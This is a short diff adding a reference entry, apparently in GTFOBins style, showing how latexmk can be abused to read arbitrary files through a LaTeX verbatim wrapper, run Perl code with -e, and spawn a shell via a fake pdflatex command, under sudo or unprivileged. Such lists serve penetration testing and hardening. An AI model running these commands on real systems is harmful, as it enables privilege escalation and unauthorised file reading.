@@ -1,0 +1,37 @@
+latexmk
+=======
+
+File read
+---------
+
+[Sudo]
+    echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
+latexmk -dvi /path/to/temp-file
+strings temp-file.dvi
+    The read file will be part of the output.
+
+[Unprivileged]
+    echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
+latexmk -dvi /path/to/temp-file
+strings temp-file.dvi
+    The read file will be part of the output.
+
+Inherit
+-------
+
+[Sudo]
+    latexmk -e '...'
+    This allows to run Perl code (`...`).
+
+[Unprivileged]
+    latexmk -e '...'
+    This allows to run Perl code (`...`).
+
+Shell
+-----
+
+[Sudo]
+    latexmk -pdf -pdflatex='/bin/sh #' /dev/null
+
+[Unprivileged]
+    latexmk -pdf -pdflatex='/bin/sh #' /dev/null
